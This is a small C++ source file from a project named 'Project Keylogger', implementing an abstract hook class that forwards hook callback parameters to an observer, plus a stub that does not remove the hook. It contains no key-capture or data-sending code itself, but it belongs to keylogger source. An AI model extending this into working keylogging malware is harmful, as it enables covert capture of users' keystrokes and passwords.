/**
 *							Project Keylogger
 */


#include					"keylogger_dll/AHook.h"

/**
 * AHook {abstract} implementation
 */


/**
 * @param HookObserver&
 */
AHook::AHook(const HookObserver& hookObserver) : _observer(hookObserver) {
}

/**
 * Notify the HookObserver _observer that a callback have been called.
 * @param int
 * @param LPARAM
 * @param WPARAM
 * @return void
 */
void							AHook::notify(const int code, const LPARAM lparam, const WPARAM wparam) {
    _observer.update(lparam, wparam);
}

/**
 * Unset the hook.
 * @return bool
 */
bool							AHook::unsetHook() {
    return false;
}